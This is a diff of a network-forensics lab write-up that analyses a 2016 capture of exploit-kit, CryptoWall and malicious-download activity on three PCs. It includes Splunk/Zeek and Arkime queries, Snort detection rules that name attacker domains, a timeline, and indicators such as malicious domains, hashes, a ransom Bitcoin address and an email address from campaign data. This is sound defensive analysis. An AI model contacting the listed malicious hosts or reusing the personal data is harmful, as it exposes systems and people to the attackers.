+tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && host.http == planetside.co.uk
+```
+
+| Time | Request (planetside.co.uk) | Cookie |
+|---|---|---|
+| 22:09:23.764 | `core.js` (port 49199) | `f602a8df…=c869e74f…` |
+| *22:09:24.829* | *gate request* | |
+| 22:09:26.423 | `caption.js` (port 49202) | `f602a8df…=c869e74f…` |
+| 22:09:29.950 | `jquerynoconflict.js` (port 49203) | `f602a8df…=c869e74f…; `**`useridA0817FB25=30`** |
+
+**[data] Reading:**
+
+- The new cookie appears **after** the gate request, with exactly the name and value from the code.
+- **No response in the capture contains `Set-Cookie: useridA08…`** — the browser's script made it, not a server.
+- `caption.js` (22:09:26) does not have it yet. **[inference]** The browser requested `caption.js` before the gate reply finished and the script's `onload` ran.
+- Conclusion: **the injected code ran, got an empty value, set its cookie and stopped.** For 48 hours it will not even ask the gate again (`if(demsFw(jcvJp4p)==oD4RG9){return false;}`).
+
+### 5-4. The rest of .52's traffic { #pc-c-rest }
+
+To write "not infected", check that nothing **is** there.
+
+```spl
+index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52
+| stats min(ts) as first_seen, count, sum(response_body_len) as bytes by host
+| where first_seen>=1452204564
+| eval first_seen=strftime(first_seen, "%H:%M:%S.%3N")
+| sort first_seen
+```
+
+```text
+host                      first_seen    count  bytes
+st.domandvilma.com        22:09:24.829  1      26
+ajax.aspnetcdn.com        22:09:29.473  1      7203
+www.google-analytics.com  22:09:50.429  5      70606
+www.outdoorsamoa.com      22:15:29.043  30     574893
+fonts.googleapis.com      22:15:31.719  2      1335
+fonts.gstatic.com         22:15:37.251  6      207328
+www.tripadvisor.com       22:15:37.251  4      31229
+www.jscache.com           22:15:48.672  3      534
+static.tacdn.com          22:15:50.974  8      30759
+www.tripadvisor.co.nz     22:15:52.968  1      406
+```
+
+```spl
+index=zeek sourcetype=zeek:files rx_hosts="192.168.122.52"
+| stats count, max(seen_bytes) as max_bytes by mime_type
+| sort - count
+```
+
+```spl
+index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52
+| stats count, min(ts) as first by user_agent
+| eval first=strftime(first, "%H:%M:%S")
+```
+
+- `sort - count` = largest first.
+
+**[data] Reading:**
+
+- New domains after the gate are CDNs and Google Analytics; **6 min later** another site (`outdoorsamoa.com`, a Samoa travel site — its Referer carries `?gclid=…`, **[inference]** a Google ad click) with Google Fonts and TripAdvisor widgets. No random sub-domains or odd TLDs.
+- File types: text, HTML, images, fonts, JavaScript only. **No `application/x-dosexec`, no Flash.** The largest `text/plain` (306,566 B) is Yahoo's search script.
+- User-Agents: IE 9 (202) and `Microsoft NCSI` (Windows' "am I online?" check at 22:06:13). **No `MSIE 7.0`.**
+
+**Conclusion for PC C:** **[data]** The same kind of attack as PC A started (hacked site → injected code → gate), but the gate answered with nothing, the code stopped, and no exploit, download or new program followed. **Not infected.** The site is still hacked — block the gate and tell the site owner.
 
 ---
 
 ## Step 6 — Simple Snort rules and a test { #snort }
 
-One very simple rule per malicious activity. Snort on pcapbox sees all TCP payload, so a `content` match on a name in the `Host:` header is enough.
+One very simple rule per malicious activity:
 
 ```text
 alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"EK securetopc.top - Sung"; content:"securetopc.top"; nocase; sid:1000051; rev:1;)
 alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"JS downloader counter id - Sung"; content:"/counter/?id="; nocase; sid:1000052; rev:1;)
-alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"CryptoWall decrypt page waytopaytosystem.com - Sung"; content:"waytopaytosystem.com"; nocase; sid:1000053; rev:1;)
+alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"Gate domandvilma.com - Sung"; content:"domandvilma.com"; nocase; sid:1000054; rev:1;)
 ```
 
-- `$HOME_NET any -> $EXTERNAL_NET 80` — from inside to outside port 80. `content` + `nocase` — this text anywhere in the packet, any case. `sid` 1000000+ = your own rules.
+- `alert tcp` — raise an alert on a matching TCP packet.
+- `$HOME_NET any -> $EXTERNAL_NET 80` — inside (private ranges) to outside port 80: the PC's HTTP requests.
+- `content:"…"` + `nocase` — this text anywhere in the packet, any case.
+- `sid` 1000000+ = your own rules; `rev` = rule version.
 
 Add each rule on **one line** to `\\10.50.10.60\rules\local.rules`, then on pcapbox:
 
 ```bash
-sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
 snort-test 20160107_ALERTS_ON_3_DIFFERENT_HOSTS
 ```
 
-**What you should see (about):** sid 1000051 for the 5 requests to `securetopc.top`, sid 1000052 for the 9 `/counter/?id=` requests, sid 1000053 for the requests to the payment site (17). If a count is a little higher, Snort matched the same text in a second packet of one request — open `index=snort pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS | stats count by sid dest_ip` to check.
+**What you should see:**
+
+```text
+[1/2] 문법 OK
+[2/2] /data/pcap/20160107_ALERTS_ON_3_DIFFERENT_HOSTS.pcap
+  count [gid:sid:rev] message
+      9 [1:1000052:1] JS downloader counter id - Sung
+      5 [1:1000051:1] EK securetopc.top - Sung
+      1 [1:1000054:1] Gate domandvilma.com - Sung
+```
+
+**[data] Reading:** every count equals the number of requests found in the analysis — 9 `/counter/` requests (4-1), 5 requests to securetopc.top (landing, `.swf` twice, `/surprise`, `/officer`), 1 gate request (5-1). Snort raises one alert per matching packet, and each request fits in one packet. No extra alerts from other traffic. To see source IPs:
+
+```spl
+index=snort sourcetype=snort:alert pcap_case="20160107_ALERTS_ON_3_DIFFERENT_HOSTS"
+| stats count, min(_time) as first, max(_time) as last, values(src_ip) as src, values(dest_ip) as dest by sid, msg
+| eval first=strftime(first, "%H:%M:%S"), last=strftime(last, "%H:%M:%S")
+```
+
+These rules fit **this** case. Attackers change domains often; next campaign they may not match.
 
 ---
 
@@ -705,19 +1066,20 @@ snort-test 20160107_ALERTS_ON_3_DIFFERENT_HOSTS
 | Time | PC | Event |
 |---|---|---|
 | 22:05:47 | all | Capture starts; DHCP for .130, .52 (22:06:02), .132 (22:06:21) |
-| 22:07:00–22:11:47 | B .130 | Yahoo Mail (HTTPS) |
-| 22:08:49 | C .52 | Yahoo search for planetside.co.uk |
-| 22:09:12 | C .52 | `planetside.co[.]uk` (hacked, injected script in `mootools-core.js`) |
-| 22:09:24 | C .52 | Gate `st.domandvilma[.]com` → `var main_color_handle='';` → **nothing follows** |
+| 22:06:35 | B .130 | Bing |
+| 22:07:00–22:08:47 | B .130 | Yahoo Mail login and use (HTTPS); after that only automatic refresh every 1–2 min |
+| 22:09:01–05 | C .52 | Yahoo search for planetside.co.uk, click (302) |
+| 22:09:12 | C .52 | `planetside.co[.]uk` (hacked; injected code at the end of `mootools-core.js`) |
+| 22:09:24 | C .52 | Gate `st.domandvilma[.]com` → `var main_color_handle='';` → cookie `useridA0817FB25=30`, **nothing follows** |
 | 22:10:08–10 | A .132 | Google result → `www.koeppl[.]com` (hacked, code before `<html>`) |
-| 22:10:15 | A .132 | EK landing `uacltr.securetopc[.]top` (89.38.144.75) |
+| 22:10:13 | A .132 | Script's cookies `PHP_SESSION_PHP` appear in koeppl requests |
+| 22:10:15 | A .132 | Hidden iframe → EK landing `uacltr.securetopc[.]top` (89.38.144.75) |
 | 22:10:17 | A .132 | Flash exploit (83 KB) |
 | 22:10:26 | A .132 | Encrypted payload (412 KB) from `gbesbsdsb.securetopc[.]top` |
-| 22:10:47–22:12:14 | A .132 | `MSIE 7.0` POST check-ins to `bizsouls[.]com`, `estudiobarco.com[.]ar` |
-| 22:11:53 | B .130 | Script starts `/counter/?id=` requests to 3 hacked sites |
-| 22:11:58–22:12:47 | B .130 | 6 EXE downloads named `.gif` (4 unique) |
+| 22:10:47–22:12:14 | A .132 | `MSIE 7.0` encrypted check-ins to `bizsouls[.]com`, then the same message to `estudiobarco.com[.]ar` |
+| 22:11:53–22:12:47 | B .130 | Script `/counter/?id=` × 9 → 6 EXEs named `.gif` (4 unique) |
 | 22:15:29 | C .52 | Normal browsing (outdoorsamoa, TripAdvisor) |
-| 22:16:46–22:17:05 | A .132 | User opens the **CryptoWall "Decrypt service"** page on `3wzn5p2yiumh7akj.waytopaytosystem[.]com` |
+| 22:16:46–22:16:57 | A .132 | User opens the **CryptoWall "Decrypt service"** page, types the captcha → "Your files are encrypted", 500 USD |
 | 22:17:18 | all | Capture ends |
 
 ---
@@ -729,11 +1091,14 @@ snort-test 20160107_ALERTS_ON_3_DIFFERENT_HOSTS
 | `www.koeppl[.]com` 92.51.131.150 | domain / IP | A | Hacked site (code before `<html>`) |
 | `uacltr.securetopc[.]top`, `gbesbsdsb.securetopc[.]top` 89.38.144.75 | domain / IP | A | Exploit kit (landing, Flash, payload) |
 | `bizsouls[.]com` 188.138.101.154, `estudiobarco.com[.]ar` 50.22.11.55 | domain / IP | A | CryptoWall check-ins (hacked sites) |
-| `3wzn5p2yiumh7akj.waytopaytosystem[.]com` 95.128.181.144 | domain / IP | A | CryptoWall payment page (Tor gateway) |
+| `3wzn5p2yiumh7akj.waytopaytosystem[.]com` 95.128.181.144 | domain / IP | A | CryptoWall payment page (tor2web) |
 | 6631e8c0d5f07004fabff81872f10d5e | MD5 | A | Flash exploit |
+| 4fd5e80b20ea9d39925155d9f8b2aa1d | MD5 | A | Check-in body sent to both C2 sites |
+| 16VXHKKtwGx8YG9qaEqszCLscUxtm326LZ | Bitcoin address | A | Ransom payment |
 | `ma-wt.com[.]sa` 216.158.85.7, `dariostoka[.]com` 174.36.186.235, `freshanointingministries-sc[.]org` 184.168.173.1 | domain / IP | B | EXE downloads (`/counter/?id=`) |
 | 9f756e72…4a79, d411bf37…7f50f7, e851eb24…cebc, 92a4d0ae…8496 | MD5 | B | Downloaded EXEs (4) |
-| `planetside.co[.]uk` 67.225.139.108 | domain / IP | C | Hacked site (injected script) |
+| `brooke.hamilton@rackspace.co.uk`, `sagemedia.org` | inside `id=` | B | Campaign data for the mail team |
+| `planetside.co[.]uk` 67.225.139.108 | domain / IP | C | Hacked site (injected `mootools-core.js`) |
 | `st.domandvilma[.]com` 192.185.21.183 | domain / IP | C | Gate (returned nothing) |
 
 ---
@@ -750,24 +1115,29 @@ index=zeek sourcetype=zeek:dhcp pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S"
 index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(host) as sites by id_orig_h user_agent | sort id_orig_h first
 index=zeek sourcetype=zeek:dns pcap_case=<case> id_resp_p=53 | stats count by id_orig_h id_resp_h
 index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host | sort id_orig_h first
-index=zeek sourcetype=zeek:conn pcap_case=<case> proto=tcp NOT id_resp_h=192.168.0.0/16 NOT [search index=zeek sourcetype=zeek:dns pcap_case=<case> | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h] | stats count by id_orig_h id_resp_h id_resp_p
-index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> ts>=<epoch> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S.%3N") | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
+index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> ts>=<epoch> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S.%3N") | sort ts | table t host uri referrer user_agent status_code resp_mime_types response_body_len
 index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5
-index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> method=POST | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | table t id_resp_h host uri user_agent request_body_len response_body_len
-index=zeek pcap_case=<case> id_orig_h=<pc> (sourcetype=zeek:ssl OR sourcetype=zeek:http) | eval name=coalesce(server_name, mvdedup(host)) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first max(t) as last count by sourcetype name | sort first
-index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> uri="/counter/*" | eval host=mvdedup(host) | rex field=uri "rnd=(?<rnd>\d+)" | eval t=strftime(ts,"%H:%M:%S") | table t id_resp_h host rnd status_code resp_filenames resp_mime_types response_body_len
-index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" mime_type="application/x-dosexec" | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(tx_hosts) as from by md5 seen_bytes
-index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" | stats count by mime_type
+index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> user_agent="*MSIE 7.0*" | eval time=strftime(ts,"%H:%M:%S.%3N") | table time id_resp_h host uri referrer status_code resp_mime_types response_body_len | sort time
+index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" mime_type="application/x-dosexec" | stats count, values(tx_hosts) as servers, values(seen_bytes) as size by md5
+index=zeek sourcetype=zeek:ssl pcap_case=<case> id_orig_h=<pc> | stats min(ts) as first, max(ts) as last, count by server_name | eval first=strftime(first,"%H:%M:%S.%3N"), last=strftime(last,"%H:%M:%S.%3N") | sort first
+index=zeek sourcetype=zeek:ssl pcap_case=<case> id_orig_h=<pc> server_name="<sni>" | sort ts | delta ts as gap | eval time=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1) | table time id_orig_p id_resp_h gap
+index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> id_resp_p=443 | eval end=ts+duration | where end>=<epoch1> AND end<<epoch2> | table ts end id_orig_p id_resp_h resp_bytes | addcoltotals resp_bytes
+index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> | stats min(ts) as first_seen, count, sum(resp_bytes) as resp_bytes by id_resp_h, id_resp_p | where first_seen>=<epoch> | eval first_seen=strftime(first_seen,"%H:%M:%S.%3N") | sort first_seen
+index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" | stats count, max(seen_bytes) as max_bytes by mime_type | sort - count
 ```
 
-**Arkime**
+**Arkime** (remember: `http.uri` = host + path)
 
 ```text
-tags == <case> && ip.src == 192.168.122.132 && host.http == www.koeppl.com && http.uri == "/"
+tags == <case> && ip.src == 192.168.122.132 && http.uri == "www.koeppl.com/"
+tags == <case> && ip.src == 192.168.122.132 && http.uri == */officer/*
+tags == <case> && ip.src == 192.168.122.132 && host.http == [bizsouls.com, estudiobarco.com.ar]
 tags == <case> && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
-tags == <case> && ip.src == 192.168.122.52 && http.uri == /media/system/js/mootools-core.js
-tags == <case> && host.http == st.domandvilma.com
-tags == <case> && ip.src == 192.168.122.130 && http.uri == /counter/*
+tags == <case> && ip.src == 192.168.122.130 && http.uri == */counter/*
+tags == <case> && ip.src == 192.168.122.130 && port.dst == 443
+tags == <case> && ip.src == 192.168.122.52 && http.uri == [planetside.co.uk/media/system/js/mootools-core.js, planetside.co.uk/media/system/js/core.js]
+tags == <case> && ip.src == 192.168.122.52 && host.http == st.domandvilma.com
+tags == <case> && ip.src == 192.168.122.52 && host.http == planetside.co.uk
 ```
 
 ---
@@ -776,12 +1146,15 @@ tags == <case> && ip.src == 192.168.122.130 && http.uri == /counter/*
 
 1. **Three alerts, three different answers.** An alert says "look here", not "infected". Decide per PC from what happened **after** the alert.
 2. **Infected = something new runs.** PC A and B both show a **new User-Agent** (`MSIE 7.0`) that is not the browser. PC C never does.
-3. **Size tells a lot.** A 26-byte reply cannot be an exploit kit; a 412 KB reply with no file type after a Flash file almost certainly is a payload.
-4. **Labels lie, content does not.** `image/gif` + `.gif` names, but Zeek's `application/x-dosexec` says "program". Always compare `resp_filenames` with `resp_mime_types`.
-5. **Read the injected code's logic, not just its address.** `if (main_color_handle.length==0) return;` explains why nothing happened on PC C.
-6. **Not every method finds something.** The no-DNS subsearch found nothing here — all C2 used names. That is a result too.
-7. **HTTPS hides the start of PC B's story.** Webmail timing (22:11:47 → 22:11:53) is the link; the attachment itself must come from the mailbox or the host.
-8. **The user's own actions matter.** PC A's user opened the ransom payment page — tell the response team before anyone pays.
+3. **Proof of execution: decide the trace first, then look for it.** The cookies on PC A and PC C were made by the injected code; no server ever sent them.
+4. **The Referer names the page, not the script, and not whether a person clicked.** Use the decoded code, the page staying open and the cookies.
+5. **Size tells a lot.** A 26-byte reply cannot be an exploit kit; a 412 KB reply with no file type after a Flash file almost certainly is a payload.
+6. **Labels lie, content does not.** `image/gif` + `.gif` names, but Zeek's `application/x-dosexec` says "program".
+7. **Compare without decoding.** Identical encrypted bodies (Arkime Body MD5s) proved a C2 list on PC A.
+8. **`stats min/max` hides the middle.** Spread events out with `delta` before linking times: the "webmail 6 s before the download" link on PC B was an automatic refresh.
+9. **Know your tools' units.** An Arkime session is a TCP connection; the Arkime graph puts a session's bytes at its last packet; Arkime's `http.uri` includes the host.
+10. **Not every method finds something.** The no-DNS subsearch found nothing; PC B showed nothing after the downloads. Those are results too.
+11. **The user's own actions matter.** PC A's user opened the ransom page and typed its captcha — tell the response team before anyone pays.
 
 ## References { #references }
 
